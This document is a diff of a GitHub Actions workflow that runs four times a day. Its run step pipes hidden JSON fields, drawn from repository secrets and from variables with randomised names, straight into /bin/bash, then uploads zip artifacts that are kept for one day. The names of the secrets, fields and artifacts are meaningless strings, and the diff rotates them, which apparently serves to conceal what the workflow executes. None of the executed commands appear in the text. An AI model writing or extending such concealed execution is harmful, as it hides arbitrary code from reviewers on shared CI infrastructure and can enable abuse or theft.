@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '40 1,7,13,19 * * *'
+    - cron: '1 4,10,16,22 * * *'
 permissions:
   contents: read
   actions: read
@@ -16,15 +16,18 @@ jobs:
         uses: actions/checkout@v4
       - name: Run
         env:
-          vguv2: ${{ secrets.vguv2 }}
+          u741: ${{ secrets.u741 }}
         run: |
-          printf '%s' "$vguv2" | jq -r .nsger1397 | /bin/bash
-          echo $rhdx1 | jq -r .bpcvx458 | /bin/bash
-          printf '%s' "$jc95" | jq -r .clpn2 | /bin/bash
+          printf '%s' "$u741" | jq -r .tq875 | /bin/bash
+          printf '%s' "$rnxup64" | jq -r .md7 | /bin/bash
+          printf '%s' "$ootz43" | jq -r .pwsw639 | /bin/bash
+          printf '%s' "$v3229" | jq -r .xstb1 | /bin/bash
+          echo $adfr77658 | jq -r .lm157 | /bin/bash
+          printf '%s' "$pwz0" | jq -r .w2653 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
         with:
-          name: L7eU18d1
+          name: F4GoLvzr
           path: "*.zip"
           retention-days: 1
